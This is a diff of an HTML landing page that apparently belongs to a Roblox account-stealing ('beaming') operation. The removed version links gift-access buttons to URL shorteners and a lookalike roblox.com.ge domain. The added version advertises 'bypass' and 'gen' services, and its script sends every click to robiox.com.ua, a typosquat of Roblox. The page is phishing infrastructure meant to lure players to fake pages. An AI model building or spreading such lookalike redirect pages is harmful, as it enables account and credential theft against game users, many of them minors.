@@ -1,92 +1,121 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title> ALL SITE GAME CONDO📂</title>
-
-  <!-- Font Minecraft-style -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mystic Services</title>
   <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
-
   <style>
     :root {
       --bg: #000;
       --text: #00ffea;
-      --button-bg: #111;
-      --button-border: #00fff7;
-      --button-hover-bg: #00fff7;
-      --button-hover-text: #000;
+      --accent: #00fff7;
+      --hover: #111;
     }
-
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
-      background-color: var(--bg);
+      background: var(--bg);
       color: var(--text);
       font-family: 'Press Start 2P', cursive;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      text-align: center;
-      padding: 1rem;
     }
-
-    h1 {
-      font-size: 1rem;
-      margin-bottom: 2rem;
-      line-height: 1.5;
-    }
-
-    .btn {
-      display: block;
-      width: 100%;
-      max-width: 300px;
-      background-color: var(--button-bg);
-      color: var(--text);
-      border: 2px solid var(--button-border);
-      padding: 1rem;
-      margin: 0.75rem auto;
-      text-decoration: none;
-      text-transform: uppercase;
-      transition: all 0.2s ease;
-      font-size: 0.6rem;
-    }
-
-    .btn:hover {
-      background-color: var(--button-hover-bg);
-      color: var(--button-hover-text);
-      transform: scale(1.05);
-    }
-
-    footer {
+    header {
       margin-top: 2rem;
+      text-align: center;
+    }
+    header h1 {
+      font-size: 1.25rem;
+      margin-bottom: 1rem;
+    }
+    nav {
+      margin-bottom: 2rem;
+    }
+    nav a {
+      color: var(--text);
+      text-decoration: none;
+      margin: 0 1rem;
+      font-size: 0.75rem;
+      transition: color 0.2s;
+    }
+    nav a:hover {
+      color: var(--accent);
+    }
+    .services {
+      width: 90%;
+      max-width: 500px;
+    }
+    .service-item {
+      background: var(--hover);
+      border: 2px solid var(--accent);
+      padding: 1rem;
+      margin: 0.5rem 0;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .service-item:hover {
+      background: var(--accent);
+      color: #000;
+      transform: scale(1.02);
+    }
+    .service-item span {
+      font-size: 0.7rem;
+    }
+    footer {
+      margin-top: auto;
+      margin-bottom: 1rem;
       font-size: 0.5rem;
-      opacity: 0.7;
+      opacity: 0.6;
     }
   </style>
 </head>
 <body>
-  <h1>CLAIM YOUR<br>GIFT ACCESS</h1>
+  <header>
+    <h1>MysticGen | #1 Sites We are the best beaming site out there!</h1>
+    <nav>
+      <a href="#">Services</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
 
-  <!-- GAME FREE -->
-  <a href="https://inlnk.co/qJMtm" target="_blank" class="btn">GAME FREE</a>
+  <div class="services">
+    <div class="service-item"><span>⭐</span> Best Site</div>
+    <div class="service-item"><span>»</span> Injuries</div>
+    <div class="service-item"><span>»</span> Immortal</div>
+    <div class="service-item"><span>»</span> SPLUNK</div>
+    <div class="service-item"><span>»</span> Hyperlink</div>
+    <div class="service-item"><span>»</span> AutoHar</div>
+    <div class="service-item"><span>»</span> Bypass</div>
+    <div class="service-item"><span>»</span> DuelHook Bypass Gen</div>
+    <div class="service-item"><span>»</span> IP Lock Bypass</div>
+  </div>
 
-  <!-- NO KEY -->
-  <a href="https://inlnk.co/uhzvm" target="_blank" class="btn">NO KEY</a>
+  <footer>
+    © 2025 Mystic Services
+  </footer>
 
-  <!-- GAME NEW -->
-  <a href="https://roblox.com.ge/games/88270880256027/WORKING-SUSSY-SWAP-SIMULATOR-2?privateServerLinkCode=40366248698028277679420581850362" target="_blank" class="btn">GAME NEW</a>
-  
-  <!-- DISCORD SEVER -->
-  <a href="https://discord.gg/QPdpXcPVBs" target="_blank" class="btn">DISCORD SEVER</a>
+  <script>
+    // Liên kết đích chung
+    const targetUrl = "https://www.robiox.com.ua/communities/2524832302/unset";
 
-
-  <footer>© 2025 — Landing Page Demo</footer>
+    // Khi click vào bất kỳ phần tử có class "service-item" hoặc link nav
+    document.querySelectorAll('.service-item').forEach(el => {
+      el.addEventListener('click', () => {
+        window.open(targetUrl, "_blank");
+      });
+    });
+    document.querySelectorAll('nav a').forEach(el => {
+      el.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.open(targetUrl, "_blank");
+      });
+    });
+  </script>
 </body>
 </html>
